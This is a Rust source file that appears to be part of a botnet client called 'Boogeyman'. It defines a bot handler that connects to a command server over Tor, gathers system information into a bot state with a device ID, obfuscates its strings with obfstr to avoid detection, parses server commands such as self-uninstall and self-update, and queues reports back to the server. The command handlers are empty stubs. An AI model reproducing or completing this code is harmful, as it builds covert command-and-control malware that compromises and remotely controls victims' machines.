use anyhow::{ Context, Result };
use client_vars::{
    constants::{ client_tag, client_version },
    types::{
        receive::{ self, BoogeymanReceivePayload },
        send::{ BoogeymanSendPayload, ServerAction, ServerParams },
        structs::BotState,
    },
};
use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
use obfstr::obfstr as s;
use crate::utils::system_info::generate_bot_state;

pub struct BotHandler {
    tor_handler: TorHandler,
    bot_state: BotState,
}

impl BotHandler {
    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
        let tor_handler = TorHandler::new(logger_config).await?;
        let bot_state = generate_bot_state(client_tag()).await;
        Ok(BotHandler { tor_handler, bot_state })
    }

    pub async fn run_handler(&mut self) {
        self.tor_handler.run(|handler, data| { Self::process_data(handler.clone(), data) }).await;
    }

    fn process_data(tor_handler: TorHandler, binary_data: Vec<u8>) -> Result<()> {
        let processed_data: BoogeymanReceivePayload = serde_json
            ::from_slice(&binary_data)
            .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;

        Self::route_data(tor_handler, processed_data)
    }

    fn route_data(tor_handler: TorHandler, processed_data: BoogeymanReceivePayload) -> Result<()> {
        match processed_data.action {
            receive::ClientAction::UninstallSelf => {}
            receive::ClientAction::UpdateSelf => {}
        }
        Ok(())
    }
    fn send_data(
        tor_handler: &mut TorHandler,
        action: ServerAction,
        params: ServerParams
    ) -> Result<()> {
        let payload = BoogeymanSendPayload {
            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
            version: client_version(),
            action,
            params,
        };

        let binary_data = serde_json
            ::to_vec(&payload)
            .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;

        tor_handler.add_to_send_queue(ServerReceiveType::Boogeyman, binary_data)
    }
}
